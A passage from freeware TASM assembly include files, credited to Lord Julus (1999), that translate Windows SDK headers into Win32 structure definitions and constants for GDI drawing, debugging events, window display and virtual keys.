    MRB_OffsetToEntries DD ?              ;
MESSAGE_RESOURCE_BLOCK ENDS               ;

MESSAGE_RESOURCE_DATA STRUC                            ;
    MRD_NumberOfBlocks DD ?                            ;
    MRD_Blocks         MESSAGE_RESOURCE_BLOCK 1 DUP(?) ;
MESSAGE_RESOURCE_DATA ENDS                             ;

EVENTLOGRECORD STRUC
    ELR_Length               DD ?  ; Length of full record
    ELR_Reserved             DD ?  ; Used by the service
    ELR_RecordNumber         DD ?  ; Absolute record number
    ELR_TimeGenerated        DD ?  ; Seconds since 1-1-1970
    ELR_TimeWritten          DD ?  ; Seconds since 1-1-1970
    ELR_EventID              DD ?  ;
    ELR_EventType            DW ?  ;
    ELR_NumStrings           DW ?  ;
    ELR_EventCategory        DW ?  ;
    ELR_ReservedFlags        DW ?  ; For use with paired events (auditing)
    ELR_ClosingRecordNumber  DD ?  ; For use with paired events (auditing)
    ELR_StringOffset         DD ?  ; Offset from beginning of record
    ELR_UserSidLength        DD ?  ;
    ELR_UserSidOffset        DD ?  ;
    ELR_DataLength           DD ?  ;
    ELR_DataOffset           DD ?  ; Offset from beginning of record
EVENTLOGRECORD ENDS                ;

OVERLAPPED STRUC                   ;
    O_Internal     DD ?            ;
    O_InternalHigh DD ?            ;
    O_Offset       DD ?            ;
    O_OffsetHigh   DD ?            ;
    O_hEvent       DD ?            ;
OVERLAPPED ENDS                    ;

SECURITY_ATTRIBUTES STRUC                  ;
    SA_nLength              DD ?           ;
    SA_lpSecurityDescriptor DD BYTE PTR ?  ;
    SA_bInheritHandle       DB ?           ;
SECURITY_ATTRIBUTES ENDS                   ;

PROCESS_INFORMATION STRUC                  ;
    PI_hProcess    DD ?                    ;
    PI_hThread     DD ?                    ;
    PI_dwProcessId DD ?                    ;
    PI_dwThreadId  DD ?                    ;
PROCESS_INFORMATION ENDS                   ;

FILETIME STRUC                             ;
    FT_dwLowDateTime  DD ?                 ;
    FT_dwHighDateTime DD ?                 ;
FILETIME ENDS                              ;

SYSTEMTIME STRUC                           ;
    ST_wYear         DW ?                  ;
    ST_wMonth        DW ?                  ;
    ST_wDayOfWeek    DW ?                  ;
    ST_wDay          DW ?                  ;
    ST_wHour         DW ?                  ;
    ST_wMinute       DW ?                  ;
    ST_wSecond       DW ?                  ;
    ST_wMilliseconds DW ?                  ;
SYSTEMTIME ENDS                            ;


SYSTEM_INFO STRUC                           ;
                                   UNION    ;
    SI_dwOemId                     DW ?     ; Obsolete field...do not use
                                   STRUC    ;
    SI_wProcessorArchitecture      DW ?     ;
    SI_wReserved                   DW ?     ;
                                   ENDS     ;
                                   ENDS     ;
    SI_dwPageSize                  DD ?     ;
    SI_lpMinimumApplicationAddress DD BYTE PTR ?
    SI_lpMaximumApplicationAddress DD BYTE PTR ?
    SI_dwActiveProcessorMask       DD ?     ;
    SI_dwNumberOfProcessors        DD ?     ;
    SI_dwProcessorType             DD ?     ;
    SI_dwAllocationGranularity     DD ?     ;
    SI_wProcessorLevel             DW ?     ;
    SI_wProcessorRevision          DW ?     ;
SYSTEM_INFO ENDS                            ;

MEMORYSTATUS STRUC                          ;
    MS_dwLength         DD ?                ;
    MS_dwMemoryLoad     DD ?                ;
    MS_dwTotalPhys      DD ?                ;
    MS_dwAvailPhys      DD ?                ;
    MS_dwTotalPageFile  DD ?                ;
    MS_dwAvailPageFile  DD ?                ;
    MS_dwTotalVirtual   DD ?                ;
    MS_dwAvailVirtual   DD ?                ;
MEMORYSTATUS ENDS                           ;

EXCEPTION_DEBUG_INFO STRUC                  ;
    EDI_ExceptionRecord EXCEPTION_RECORD ?  ;
    EDI_dwFirstChance DD ?                  ;
EXCEPTION_DEBUG_INFO ENDS                   ;

THREAD_START_ROUTINE STRUC                  ; I wasn't able to find a right
                     DD BYTE PTR ?          ; definition for this one
THREAD_START_ROUTINE ENDS                   ;

CREATE_THREAD_DEBUG_INFO STRUC              ;
    CTDI_hThread            DD ?            ;
    CTDI_lpThreadLocalBase  DD BYTE PTR ?   ;
    CTDI_lpStartAddress     DD BYTE PTR THREAD_START_ROUTINE
CREATE_THREAD_DEBUG_INFO ENDS               ;

CREATE_PROCESS_DEBUG_INFO STRUC               ;
    CPDI_hFile                 DD ?           ;
    CPDI_hProcess              DD ?           ;
    CPDI_hThread               DD ?           ;
    CPDI_lpBaseOfImage         DD BYTE PTR ?  ;
    CPDI_dwDebugInfoFileOffset DD ?           ;
    CPDI_nDebugInfoSize        DD ?           ;
    CPDI_lpThreadLocalBase     DD BYTE PTR ?  ;
    CPDI_lpStartAddress        DD BYTE PTR THREAD_START_ROUTINE
    CPDI_lpImageName           DD BYTE PTR ?  ;
    CPDI_fUnicode              DW ?           ;
CREATE_PROCESS_DEBUG_INFO ENDS                ;

EXIT_THREAD_DEBUG_INFO STRUC                  ;
    ETDI_dwExitCode DD ?                      ;
EXIT_THREAD_DEBUG_INFO  ENDS                  ;

EXIT_PROCESS_DEBUG_INFO STRUC                 ;
    EPDI_dwExitCode DD ?                      ;
EXIT_PROCESS_DEBUG_INFO ENDS                  ;

LOAD_DLL_DEBUG_INFO STRUC                     ;
    LDDI_hFile                 DD ?           ;
    LDDI_lpBaseOfDll           DD BYTE PTR ?  ;
    LDDI_dwDebugInfoFileOffset DD ?           ;
    LDDI_nDebugInfoSize        DD ?           ;
    LDDI_lpImageName           DD BYTE PTR ?  ;
    LDDI_fUnicode              DW ?           ;
LOAD_DLL_DEBUG_INFO ENDS                      ;

UNLOAD_DLL_DEBUG_INFO STRUC                   ;
    UDDI_lpBaseOfDll DD BYTE PTR ?            ;
UNLOAD_DLL_DEBUG_INFO ENDS                    ;

OUTPUT_DEBUG_STRING_INFO STRUC                ;
    ODSI_lpDebugStringData DD BYTE PTR ?      ;
    ODSI_fUnicode           DW ?              ;
    ODSI_nDebugStringLength DW ?              ;
OUTPUT_DEBUG_STRING_INFO ENDS                 ;

RIP_INFO STRUC
    RIP_dwError dd ?
    RIP_dwType  dd ?
RIP_INFO ENDS

DEBUG_EVENT STRUC                                         ;
    DEV_dwDebugEventCode   DD ?                           ;
    DEV_dwProcessId        DD ?                           ;
    DEV_dwThreadId         DD ?                           ;
                           UNION                          ;
    DEV_Exception          EXCEPTION_DEBUG_INFO       ?   ;
    DEV_CreateThread       CREATE_THREAD_DEBUG_INFO   ?   ;
    DEV_CreateProcessInfo  CREATE_PROCESS_DEBUG_INFO  ?   ;
    DEV_ExitThread         EXIT_THREAD_DEBUG_INFO     ?   ;
    DEV_ExitProcess        EXIT_PROCESS_DEBUG_INFO    ?   ;
    DEV_LoadDll            LOAD_DLL_DEBUG_INFO        ?   ;
    DEV_UnloadDll          UNLOAD_DLL_DEBUG_INFO      ?   ;
    DEV_DebugString        OUTPUT_DEBUG_STRING_INFO   ?   ;
    DEV_RipInfo            RIP_INFO                   ?   ;
                           ENDS                           ;
DEBUG_EVENT ENDS                                          ;


PROCESS_HEAP_ENTRY STRUC               ;
    lpData            DD BYTE PTR ?    ;
    cbData            DD ?             ;
    cbOverhead        DB ?             ;
    iRegionIndex      DB ?             ;
    wFlags            DW ?             ;
                      UNION            ;
                      STRUC            ;
    hMem              DD ?             ;
    dwReserved        DD 3 DUP(?)      ;
                      ENDS             ;
                      STRUC            ;
    dwCommittedSize   DD ?             ;
    dwUnCommittedSize DD ?             ;
    lpFirstBlock      DD BYTE PTR ?    ;
    lpLastBlock       DD BYTE PTR ?    ;
                      ENDS             ;
                      ENDS             ;
PROCESS_HEAP_ENTRY ENDS                ;


STARTUPINFO STRUC                      ;
    STI_cb              DD ?           ;
    STI_lpReserved      DD BYTE PTR ?  ;
    STI_lpDesktop       DD BYTE PTR ?  ;
    STI_lpTitle         DD BYTE PTR ?  ;
    STI_dwX             DD ?           ;
    STI_dwY             DD ?           ;
    STI_dwXSize         DD ?           ;
    STI_dwYSize         DD ?           ;
    STI_dwXCountChars   DD ?           ;
    STI_dwYCountChars   DD ?           ;
    STI_dwFillAttribute DD ?           ;
    STI_dwFlags         DD ?           ;
    STI_wShowWindow     DW ?           ;
    STI_cbReserved2     DW ?           ;
    STI_lpReserved2     DD BYTE PTR ?  ;
    STI_hStdInput       DD ?           ;
    STI_hStdOutput      DD ?           ;
    STI_hStdError       DD ?           ;
STARTUPINFO ENDS                       ;

WIN32_FIND_DATA STRUC                           ;
    WFD_dwFileAttributes     DD ?               ;
    WFD_ftCreationTime       FILETIME ?         ;
    WFD_ftLastAccessTime     FILETIME ?         ;
    WFD_ftLastWriteTime      FILETIME ?         ;
    WFD_nFileSizeHigh        DD ?               ;
    WFD_nFileSizeLow         DD ?               ;
    WFD_dwReserved0          DD ?               ;
    WFD_dwReserved1          DD ?               ;
    WFD_cFileName            DB MAX_PATH DUP(?) ;
    WFD_cAlternateFileName   DB 14 DUP(?)       ;
WIN32_FIND_DATA ENDS                            ;

WIN32_FILE_ATTRIBUTE_DATA STRUC                 ;
    WFAD_dwFileAttributes    DD ?               ;
    WFAD_ftCreationTime      FILETIME ?         ;
    WFAD_ftLastAccessTime    FILETIME ?         ;
    WFAD_ftLastWriteTime     FILETIME ?         ;
    WFAD_nFileSizeHigh       DD ?               ;
    WFAD_nFileSizeLow        DD ?               ;
WIN32_FILE_ATTRIBUTE_DATA ENDS                  ;

DUPLICATE_CLOSE_SOURCE     equ 00000001
DUPLICATE_SAME_ACCESS      equ 00000002


;      ≥ Misclancellous Structures and Equates ≥
;ƒƒƒƒƒƒ¥ as they appear in the Windows.inc     √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;      ≥ file from TASM 5.0 include directory. ≥

; Point

POINT struc
      x DD ?
      y DD ?
POINT ends


;       Rectangle

RECT    struc
        rcLeft          UINT ?
        rcTop           UINT ?
        rcRight         UINT ?
        rcBottom        UINT ?
RECT    ends

;  Window Class structure

WNDCLASS struc
        clsStyle          UINT     ?   ; class style
        clsLpfnWndProc    ULONG    ?
        clsCbClsExtra     UINT     ?
        clsCbWndExtra     UINT     ?
        clsHInstance      UINT     ?   ; instance handle
        clsHIcon          UINT     ?   ; class icon handle
        clsHCursor        UINT     ?   ; class cursor handle
        clsHbrBackground  UINT     ?   ; class background brush
        clsLpszMenuName   ULONG    ?   ; menu name
        clsLpszClassName  ULONG    ?   ; far ptr to class name
WNDCLASS ends

STD_WINDOW STRUC
           wcxSize         dd ?
           wcxStyle        dd ?
           wcxWndProc      dd ?
           wcxClsExtra     dd ?
           wcxWndExtra     dd ?
           wcxInstance     dd ?
           wcxIcon         dd ?
           wcxCursor       dd ?
           wcxBkgndBrush   dd ?
           wcxMenuName     dd ?
           wcxClassName    dd ?
           wcxSmallIcon    dd ?
STD_WINDOW ENDS


PAINTSTRUCT STRUC
    PShdc         UINT             ?
    PSfErase      UINT             ?
    PSrcPaint     UCHAR            size RECT dup(?)
    PSfRestore    UINT             ?
    PSfIncUpdate  UINT             ?
    PSrgbReserved UCHAR            16 dup(?)
PAINTSTRUCT ENDS

MSGSTRUCT struc
    msHWND          UINT    ?
    msMESSAGE       UINT    ?
    msWPARAM        UINT    ?
    msLPARAM        ULONG   ?
    msTIME          ULONG   ?
    msPT            ULONG   ?
MSGSTRUCT ends

MINMAXINFO struc
  res_x               dd ?
  res_y               dd ?
  maxsize_x           dd ?
  maxsize_y           dd ?
  maxposition_x       dd ?
  maxposition_y       dd ?
  mintrackposition_x  dd ?
  mintrackposition_y  dd ?
  maxtrackposition_x  dd ?
  maxtrackposition_y  dd ?
MINMAXINFO ends

TEXTMETRIC struc
    tmHeight        dw      ?
    tmAscent        dw      ?
    tmDescent       dw      ?
    tmIntLeading    dw      ?
    tmExtLeading    dw      ?
    tmAveCharWidth  dw      ?
    tmMaxCharWidth  dw      ?
    tmWeight        dw      ?
    tmItalic        db      ?
    tmUnderlined    db      ?
    tmStruckOut     db      ?
    tmFirstChar     db      ?
    tmLastChar      db      ?
    tmDefaultChar   db      ?
    tmBreakChar     db      ?
    tmPitch         db      ?
    tmCharSet       db      ?
    tmOverhang      dw      ?
    tmAspectX       dw      ?
    tmAspectY       dw      ?
TEXTMETRIC ends

LF_FACESIZE     EQU     32

LOGFONT struc
    lfHeight          dw   ?
    lfWidth           dw   ?
    lfEscapement      dw   ?
    lfOrientation     dw   ?
    lfWeight          dw   ?
    lfItalic          db   ?
    lfUnderline       db   ?
    lfStrikeOut       db   ?
    lfCharSet         db   ?
    lfOutPrecision    db   ?
    lfClipPrecision   db   ?
    lfQuality         db   ?
    lfPitchAndFamily  db   ?
    lfFaceName        db   LF_FACESIZE dup(?)
LOGFONT ends

LOGBRUSH struc
    lbStyle         dw ?
    lbColor         dd ?
    lbHatch         dw ?
LOGBRUSH ends

;  Text Drawing modes

TRANSPARENT     = 1
OPAQUE          = 2

; Mapping Modes

MM_TEXT         =   1
MM_LOMETRIC     =   2
MM_HIMETRIC     =   3
MM_LOENGLISH    =   4
MM_HIENGLISH    =   5
MM_TWIPS        =   6
MM_ISOTROPIC    =   7
MM_ANISOTROPIC  =   8

; Coordinate Modes

ABSOLUTE        =   1
RELATIVE        =   2

;  Stock Logical Objects

WHITE_BRUSH         =  0
LTGRAY_BRUSH        =  1
GRAY_BRUSH          =  2
DKGRAY_BRUSH        =  3
BLACK_BRUSH         =  4
NULL_BRUSH          =  5
HOLLOW_BRUSH        =  5
WHITE_PEN           =  6
BLACK_PEN           =  7
NULL_PEN            =  8
DOT_MARKER          =  9
OEM_FIXED_FONT      = 10
ANSI_FIXED_FONT     = 11
ANSI_VAR_FONT       = 12
SYSTEM_FONT         = 13
DEVICE_DEFAULT_FONT = 14
DEFAULT_PALETTE     = 15
SYSTEM_FIXED_FONT   = 16

; Brush Styles

BS_SOLID        =   0
BS_NULL         =   1
BS_HOLLOW       =   BS_NULL
BS_HATCHED      =   2
BS_PATTERN      =   3
BS_INDEXED      =   4
BS_DIBPATTERN   =   5

; Hatch Styles

HS_HORIZONTAL   =   0       ; -----
HS_VERTICAL     =   1       ; |||||
HS_FDIAGONAL    =   2       ; \\\\\
HS_BDIAGONAL    =   3       ; /////
HS_CROSS        =   4       ; +++++
HS_DIAGCROSS    =   5       ; xxxxx

; Pen Styles

PS_SOLID        =   0
PS_DASH         =   1       ; -------
PS_DOT          =   2       ; .......
PS_DASHDOT      =   3       ; _._._._
PS_DASHDOTDOT   =   4       ; _.._.._
PS_NULL         =   5
PS_INSIDEFRAME  =   6

; Device Parameters for GetDeviceCaps()

DRIVERVERSION =0     ; Device driver version
TECHNOLOGY    =2     ; Device classification
HORZSIZE      =4     ; Horizontal size in millimeters
VERTSIZE      =6     ; Vertical size in millimeters
HORZRES       =8     ; Horizontal width in pixels
VERTRES       =10    ; Vertical width in pixels
BITSPIXEL     =12    ; Number of bits per pixel
PLANES        =14    ; Number of planes
NUMBRUSHES    =16    ; Number of brushes the device has
NUMPENS       =18    ; Number of pens the device has
NUMMARKERS    =20    ; Number of markers the device has
NUMFONTS      =22    ; Number of fonts the device has
NUMCOLORS     =24    ; Number of colors the device supports
PDEVICESIZE   =26    ; Size required for device descriptor
CURVECAPS     =28    ; Curve capabilities
LINECAPS      =30    ; Line capabilities
POLYGONALCAPS =32    ; Polygonal capabilities
TEXTCAPS      =34    ; Text capabilities
CLIPCAPS      =36    ; Clipping capabilities
RASTERCAPS    =38    ; Bitblt capabilities
ASPECTX       =40    ; Length of the X leg
ASPECTY       =42    ; Length of the Y leg
ASPECTXY      =44    ; Length of the hypotenuse

LOGPIXELSX    =88    ; Logical pixels/inch in X
LOGPIXELSY    =90    ; Logical pixels/inch in Y

SIZEPALETTE   =104   ; Number of entries in physical palette
NUMRESERVED   =106   ; Number of reserved entries in palette
COLORRES      =108   ; Actual color resolution

; Device Capability Masks:

; Device Technologies
DT_PLOTTER       =   0  ;  Vector plotter
DT_RASDISPLAY    =   1  ;  Raster display
DT_RASPRINTER    =   2  ;  Raster printer
DT_RASCAMERA     =   3  ;  Raster camera
DT_CHARSTREAM    =   4  ;  Character-stream, PLP
DT_METAFILE      =   5  ;  Metafile, VDM
DT_DISPFILE      =   6  ;  Display-file

; Curve Capabilities

CC_NONE          =   0  ;  Curves not supported
CC_CIRCLES       =   1  ;  Can do circles
CC_PIE           =   2  ;  Can do pie wedges
CC_CHORD         =   4  ;  Can do chord arcs
CC_ELLIPSES      =   8  ;  Can do ellipese
CC_WIDE          =   16 ;  Can do wide lines
CC_STYLED        =   32 ;  Can do styled lines
CC_WIDESTYLED    =   64 ;  Can do wide styled lines
CC_INTERIORS     =   128;  Can do interiors

; Line Capabilities

LC_NONE          =   0  ;  Lines not supported
LC_POLYLINE      =   2  ;  Can do polylines
LC_MARKER        =   4  ;  Can do markers
LC_POLYMARKER    =   8  ;  Can do polymarkers
LC_WIDE          =   16 ;  Can do wide lines
LC_STYLED        =   32 ;  Can do styled lines
LC_WIDESTYLED    =   64 ;  Can do wide styled lines
LC_INTERIORS     =   128;  Can do interiors

; Polygonal Capabilities

PC_NONE          =   0  ;  Polygonals not supported
PC_POLYGON       =   1  ;  Can do polygons
PC_RECTANGLE     =   2  ;  Can do rectangles
PC_WINDPOLYGON   =   4  ;  Can do winding polygons
PC_TRAPEZOID     =   4  ;  Can do trapezoids
PC_SCANLINE      =   8  ;  Can do scanlines
PC_WIDE          =   16 ;  Can do wide borders
PC_STYLED        =   32 ;  Can do styled borders
PC_WIDESTYLED    =   64 ;  Can do wide styled borders
PC_INTERIORS     =   128;  Can do interiors

; Polygonal Capabilities

CP_NONE          =   0  ;  No clipping of output
CP_RECTANGLE     =   1  ;  Output clipped to rects

; Text Capabilities

TC_OP_CHARACTER  =   0001h ;  Can do OutputPrecision   CHARACTER
TC_OP_STROKE     =   0002h ;  Can do OutputPrecision   STROKE
TC_CP_STROKE     =   0004h ;  Can do ClipPrecision     STROKE
TC_CR_90         =   0008h ;  Can do CharRotAbility    90
TC_CR_ANY        =   0010h ;  Can do CharRotAbility    ANY
TC_SF_X_YINDEP   =   0020h ;  Can do ScaleFreedom      X_YINDEPENDENT
TC_SA_DOUBLE     =   0040h ;  Can do ScaleAbility      DOUBLE
TC_SA_INTEGER    =   0080h ;  Can do ScaleAbility      INTEGER
TC_SA_CONTIN     =   0100h ;  Can do ScaleAbility      CONTINUOUS
TC_EA_DOUBLE     =   0200h ;  Can do EmboldenAbility   DOUBLE
TC_IA_ABLE       =   0400h ;  Can do ItalisizeAbility  ABLE
TC_UA_ABLE       =   0800h ;  Can do UnderlineAbility  ABLE
TC_SO_ABLE       =   1000h ;  Can do StrikeOutAbility  ABLE
TC_RA_ABLE       =   2000h ;  Can do RasterFontAble    ABLE
TC_VA_ABLE       =   4000h ;  Can do VectorFontAble    ABLE
TC_RESERVED      =   8000h

; Raster Capabilities

RC_BITBLT        =   1      ;  Can do standard BLT.
RC_BANDING       =   2      ;  Device requires banding support
RC_SCALING       =   4      ;  Device requires scaling support
RC_BITMAP64      =   8      ;  Device can support >64K bitmap
RC_GDI20_OUTPUT  =   0010h  ;  has 2.0 output calls
RC_DI_BITMAP     =   0080h  ;  supports DIB to memory
RC_PALETTE       =   0100h  ;  supports a palette
RC_DIBTODEV      =   0200h  ;  supports DIBitsToDevice
RC_BIGFONT       =   0400h  ;  supports >64K fonts
RC_STRETCHBLT    =   0800h  ;  supports StretchBlt
RC_FLOODFILL     =   1000h  ;  supports FloodFill
RC_STRETCHDIB    =   2000h  ;  supports StretchDIBits

; palette entry flags

PC_RESERVED     = 1    ; palette index used for animation
PC_EXPLICIT     = 2    ; palette index is explicit to device
PC_NOCOLLAPSE   = 4    ; do not match color to system palette

; DIB color table identifiers

DIB_RGB_COLORS  = 0    ; color table in RGBTriples
DIB_PAL_COLORS  = 1    ; color table in palette indices

;constants for Get/SetSystemPaletteUse()

SYSPAL_STATIC   = 1
SYSPAL_NOSTATIC = 2

; constants for CreateDIBitmap

CBM_INIT        = 4    ; initialize bitmap

; Bitmap format constants

BI_RGB          = 0
BI_RLE8         = 1
BI_RLE4         = 2

ANSI_CHARSET    = 0
SYMBOL_CHARSET  = 2
OEM_CHARSET     = 255

;  styles for CombineRgn

RGN_AND  = 1
RGN_OR   = 2
RGN_XOR  = 3
RGN_DIFF = 4
RGN_COPY = 5

;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥           END OF FILE            √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

;                             wasn't it obvious ? ;-)
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[W32NT_LJ.INC]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[W32US_LJ.INC]ƒƒƒ
comment $

                  Lord Julus presents the Win32 help series

⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
⁄ƒø                                                                       ⁄ƒø
≥ ≥             This  is my transformation of the original WINUSER.H      ≥ ≥
≥ ≥     file  from the Microsoft Windows SDK(C) for Windows  NT  5.0      ≥ ≥
≥ ≥     beta 2 and Windows 98, released on in Sept. 1998.                 ≥ ≥
≥ ≥     This  file  was   transformed  by  me  from  the original  C      ≥ ≥
≥ ≥     definition  into assembly language. You can use this file to      ≥ ≥
≥ ≥     quicken  up  writting your win32 programs in assembler.  You      ≥ ≥
≥ ≥     can use these files as you wish, as they are freeware.            ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥             However,  if  you find any mistake inside this file,      ≥ ≥
≥ ≥     it  is  probably due to the fact that I merely could see the      ≥ ≥
≥ ≥     monitor  while  converting  the  files. So, if you do notice      ≥ ≥
≥ ≥     something, please notify me on my e-mail address at:              ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥                   lordjulus@geocities.com                             ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥             Also, if you find any other useful stuff that can be      ≥ ≥
≥ ≥     included here, do not hesitate to tell me.                        ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥     Good luck,                                                        ≥ ≥
≥ ≥                                ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø              ≥ ≥
≥ ≥                                ≥  Lord Julus (c) 1999  ≥              ≥ ≥
≥ ≥                                ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ              ≥ ≥
≥ ≥                                                                       ≥ ≥
¿ƒŸ                                                                       ¿ƒŸ
⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

        $

; Predefined Resource Types

RESOURCE_CONNECTED      EQU 00000001h
RESOURCE_GLOBALNET      EQU 00000002h
RESOURCE_REMEMBERED     EQU 00000003h
RESOURCE_RECENT         EQU 00000004h
RESOURCE_CONTEXT        EQU 00000005h

RESOURCETYPE_ANY        EQU 00000000h
RESOURCETYPE_DISK       EQU 00000001h
RESOURCETYPE_PRINT      EQU 00000002h
RESOURCETYPE_RESERVED   EQU 00000008h
RESOURCETYPE_UNKNOWN    EQU 0FFFFFFFFh

RESOURCEUSAGE_CONNECTABLE   EQU 00000001h
RESOURCEUSAGE_CONTAINER     EQU 00000002h
RESOURCEUSAGE_NOLOCALDEVICE EQU 00000004h
RESOURCEUSAGE_SIBLING       EQU 00000008h
RESOURCEUSAGE_ATTACHED      EQU 00000010h
RESOURCEUSAGE_ALL           EQU RESOURCEUSAGE_CONNECTABLE OR\
                                RESOURCEUSAGE_CONTAINER OR\
                                RESOURCEUSAGE_ATTACHED
RESOURCEUSAGE_RESERVED      EQU 80000000h

RESOURCEDISPLAYTYPE_GENERIC        EQU 00000000h
RESOURCEDISPLAYTYPE_DOMAIN         EQU 00000001h
RESOURCEDISPLAYTYPE_SERVER         EQU 00000002h
RESOURCEDISPLAYTYPE_SHARE          EQU 00000003h
RESOURCEDISPLAYTYPE_FILE           EQU 00000004h
RESOURCEDISPLAYTYPE_GROUP          EQU 00000005h
RESOURCEDISPLAYTYPE_NETWORK        EQU 00000006h
RESOURCEDISPLAYTYPE_ROOT           EQU 00000007h
RESOURCEDISPLAYTYPE_SHAREADMIN     EQU 00000008h
RESOURCEDISPLAYTYPE_DIRECTORY      EQU 00000009h
RESOURCEDISPLAYTYPE_TREE           EQU 0000000Ah
RESOURCEDISPLAYTYPE_NDSCONTAINER   EQU 0000000Bh

NETRESOURCEA STRUC
    dwScope        DD 0
    dwType         DD 0
    dwDisplayType  DD 0
    dwUsage        DD 0
    lpLocalName    DD 0
    lpRemoteName   DD 0
    lpComment      DD 0
    lpProvider     DD 0
NETRESOURCEA ENDS

;---


 RT_CURSOR           EQU 1
 RT_BITMAP           EQU 2
 RT_ICON             EQU 3
 RT_MENU             EQU 4
 RT_DIALOG           EQU 5
 RT_STRING           EQU 6
 RT_FONTDIR          EQU 7
 RT_FONT             EQU 8
 RT_ACCELERATOR      EQU 9
 RT_RCDATA           EQU 10
 RT_MESSAGETABLE     EQU 11
 DIFFERENCE          EQU 11
 RT_GROUP_CURSOR     EQU RT_CURSOR + DIFFERENCE
 RT_GROUP_ICON       EQU RT_ICON + DIFFERENCE
 RT_VERSION          EQU 16
 RT_DLGINCLUDE       EQU 17
 RT_PLUGPLAY         EQU 19
 RT_VXD              EQU 20
 RT_ANICURSOR        EQU 21
 RT_ANIICON          EQU 22
 RT_HTML             EQU 23

; Scroll Bar Constants

 SB_HORZ             EQU 0
 SB_VERT             EQU 1
 SB_CTL              EQU 2
 SB_BOTH             EQU 3
 SB_LINEUP           EQU 0
 SB_LINELEFT         EQU 0
 SB_LINEDOWN         EQU 1
 SB_LINERIGHT        EQU 1
 SB_PAGEUP           EQU 2
 SB_PAGELEFT         EQU 2
 SB_PAGEDOWN         EQU 3
 SB_PAGERIGHT        EQU 3
 SB_THUMBPOSITION    EQU 4
 SB_THUMBTRACK       EQU 5
 SB_TOP              EQU 6
 SB_LEFT             EQU 6
 SB_BOTTOM           EQU 7
 SB_RIGHT            EQU 7
 SB_ENDSCROLL        EQU 8

; ShowWindow() Commands

 SW_HIDE             EQU 0
 SW_SHOWNORMAL       EQU 1
 SW_NORMAL           EQU 1
 SW_SHOWMINIMIZED    EQU 2
 SW_SHOWMAXIMIZED    EQU 3
 SW_MAXIMIZE         EQU 3
 SW_SHOWNOACTIVATE   EQU 4
 SW_SHOW             EQU 5
 SW_MINIMIZE         EQU 6
 SW_SHOWMINNOACTIVE  EQU 7
 SW_SHOWNA           EQU 8
 SW_RESTORE          EQU 9
 SW_SHOWDEFAULT      EQU 10
 SW_FORCEMINIMIZE    EQU 11
 SW_MAX              EQU 11

; Old ShowWindow() Commands

 HIDE_WINDOW         EQU 0
 SHOW_OPENWINDOW     EQU 1
 SHOW_ICONWINDOW     EQU 2
 SHOW_FULLSCREEN     EQU 3
 SHOW_OPENNOACTIVATE EQU 4

; Identifiers for the WM_SHOWWINDOW message

 SW_PARENTCLOSING    EQU 1
 SW_OTHERZOOM        EQU 2
 SW_PARENTOPENING    EQU 3
 SW_OTHERUNZOOM      EQU 4

; AnimateWindow() Commands

 AW_HOR_POSITIVE             EQU 00000001h
 AW_HOR_NEGATIVE             EQU 00000002h
 AW_VER_POSITIVE             EQU 00000004h
 AW_VER_NEGATIVE             EQU 00000008h
 AW_CENTER                   EQU 00000010h
 AW_HIDE                     EQU 00010000h
 AW_ACTIVATE                 EQU 00020000h
 AW_SLIDE                    EQU 00040000h
 AW_BLEND                    EQU 00080000h

; WM_KEYUP/DOWN/CHAR HIWORD(lParam) flags

 KF_EXTENDED         EQU 0100h
 KF_DLGMODE          EQU 0800h
 KF_MENUMODE         EQU 1000h
 KF_ALTDOWN          EQU 2000h
 KF_REPEAT           EQU 4000h
 KF_UP               EQU 8000h

; Virtual Keys, Standard Set

 VK_LBUTTON        EQU 01h
 VK_RBUTTON        EQU 02h
 VK_CANCEL         EQU 03h
 VK_MBUTTON        EQU 04h
 VK_BACK           EQU 08h
 VK_TAB            EQU 09h
 VK_CLEAR          EQU 0Ch
 VK_RETURN         EQU 0Dh
 VK_SHIFT          EQU 10h
 VK_CONTROL        EQU 11h
 VK_MENU           EQU 12h
 VK_PAUSE          EQU 13h
 VK_CAPITAL        EQU 14h
 VK_KANA           EQU 15h
